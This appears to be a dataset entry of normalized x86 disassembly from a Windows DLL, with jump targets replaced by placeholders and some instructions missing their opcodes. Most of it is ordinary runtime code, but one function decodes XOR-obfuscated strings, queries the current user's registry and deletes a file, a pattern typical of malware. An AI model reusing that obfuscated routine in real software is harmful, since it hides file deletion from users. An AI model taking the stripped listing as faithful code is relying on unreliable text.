call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ ebp - 0xf0 ]
lea ecx [ esi + 0x13c ]
call sub_100617a0
lea eax [ ebp - 0xec ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
xor eax eax
lea edx [ ebp - 0xac ]
mov eax 0x83
call sub_10045930
lea ecx [ ebp - 0xe4 ]
push edi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x3
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x11
mov [ ebp - 0x4 ] 0x4
call sub_100205a0
mov edi 0x8
cmp [ ebp - 0xb4 ] edi
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x4c ]
push edx
lea ecx [ ebp - 0xc8 ]
call sub_1005ddc0
lea edx [ ebp - 0xc8 ]
mov ecx 0x11
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
cmp [ ebp - 0xb4 ] 0x8
jb r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
xor eax eax
mov esi 0x7
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] ax
cmp [ ebp - 0xd0 ] edi
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0xe8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp - 0xc8 ]
push eax
call sub_100187af
add esp 0x4
xor edx edx
lea eax [ ebp - 0xec ]
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0xe4 ] dx
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_1001c8b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100861a4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_100724b7
mov eax [ esi + 0x1c ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push eax
call sub_10035d06
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call sub_10035d06
add esp 0x4
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_10035d06
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10069747
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_10035d06
add esp 0x4
sub_1001c970
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
push edi
mov edi [ ebx + 0x4 ]
mov [ ebp - 0x28 ] ebx
test edi edi
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x130
call sub_10053240
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x49
call sub_10053240
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call sub_1007f5d0
mov ebx [ ebp - 0x28 ]
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f5d0
add esp 0xc
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
sub_1001ca80
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10010a60
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1001caa1
push 0x4c
mov eax sub_10085240
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x50 ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x3c ] al
lea eax [ ebp - 0x58 ]
push eax
mov ecx ebx
mov [ ebp - 0x30 ] edi
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_100188c2
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
call sub_10034a80
mov ecx [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000ff3d
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x34 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
mov edi [ ebx + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x34 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x54 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x40 ] al
push [ ebp - 0x40 ]
lea eax [ ebp - 0x4c ]
push [ ebp - 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_10001ca2
mov ecx [ eax ]
push edi
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
xor esi esi
push [ ebp - 0x38 ]
mov [ ebp + 0x14 ] eax
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_10007c43
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
mov eax [ ebp - 0x50 ]
call sub_1004642f
retn
cmp eax 0x100
lea eax [ ebp - 0x44 ]
je r-xdata
cmp edi [ ebp - 0x30 ]
jbe r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x34 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_10069e87
mov ecx [ eax ]
add esi [ ebp - 0x34 ]
push edi
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x34 ]
push [ eax ]
sub [ ebp - 0x30 ] ecx
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x38 ]
call sub_10007c43
add esp 0x30
push edi
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_10007c43
add esp 0x18
jmp r-xdata
sub edi [ ebp - 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x48 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ ebp - 0x34 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp - 0x30 ]
sub eax edi
inc eax
push eax
lea ecx [ esi + edi ]
push ecx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
mov [ ebp - 0x40 ] ecx
call sub_100060f2
mov eax [ ebp - 0x40 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x48 ]
add esp 0x10
inc [ ebp - 0x30 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
sub_1001ccb0
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
push eax
push edx
call sub_10040ba0
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_100649e0
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_1001ccfc
push 0x28
mov eax sub_1008552b
call sub_100624bc
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_10069606
mov [ esi ] r--data
jmp r-xdata
sub_1001cdb2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_100079d1
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001ce10
push ebp
mov ebp esp
sub esp 0x2ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x208
lea eax [ ebp - 0x2ac ]
push 0x0
push eax
call sub_1007f940
mov ecx [ r--data ]
add esp 0xc
xor esi esi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0x3d
jb r-xdata
lea ecx [ ebp - 0xa4 ]
push ecx
xor eax eax
push 0x80000001
mov [ ebp - 0x2a ] ax
call sub_100290e0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
nop
mov esi 0x1
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x70
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
push 0x104
lea ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x28 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call [ ExpandEnvironmentStringsW@IAT ]
lea eax [ ebp - 0x2ac ]
push eax
call [ DeleteFileW@IAT ]
test eax eax
mov eax 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax esi
sub_1001ceed
push 0x8
mov eax sub_1008544c
call sub_10013486
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10059d69
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_1002f11b
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10007a90
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_1000b3d2
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_1000b3d2
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_1000b3d2
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_1004a330
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_1004a330
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_10013ab8
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1007f5d0
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_1007f5d0
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10048a74
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_10048a74
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1001d050
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
push edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edi ecx
sub edi eax
xor edi edi
jmp r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10021370
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub eax ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
add esi edi
pop edi
mov [ eax ] esi
pop esi
pop ebp
retn 0xc
mov esi [ esi ]
sub_1001d099
push 0x6c
mov eax sub_100856bc
call sub_1003fae8
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_10071f2c
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] eax
call sub_10034a80
mov ecx [ ebp - 0x70 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1000ff3d
lea ebx [ edi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] ebx
call sub_1004a330
movzx eax ax
add esp 0xc
push [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] 0x0
call sub_10069d0f
test al al
jne r-xdata
push ebx
push ecx
push [ ebp - 0x64 ]
push esi
push [ ebp - 0x68 ]
push edi
call sub_1003edde
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor edi edi
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_1004642f
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2b
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
push [ ebp - 0x64 ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ebx [ ebp - 0x64 ]
push ebx
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2d
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005a5dc
mov edi [ ebp - 0x60 ]
test edi edi
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x38 ] edi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
push ebx
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push ebx
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
call sub_1002f11b
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005a5dc
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10069d0f
test al al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push ebx
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
mov ebx [ ebp - 0x58 ]
cmp bx ax
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_1002c8c0
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x65
call sub_1004a330
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001c121
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
mov ebx [ ebp - 0x58 ]
cmp [ esi + 0x6 ] bx
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
push [ ebp - 0x64 ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
movzx ecx bx
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001c121
cmp edi 0x24
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1005a5dc
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] edi
je r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
push edi
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x45
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov al [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_1001c121
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc edi
mov ecx esi
call sub_1001c121
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x74 ]
jne r-xdata
mov ecx esi
call sub_1001c121
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005a5dc
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_1001c121
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x64 ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
cmp ebx 0x8
jge r-xdata
mov ecx esi
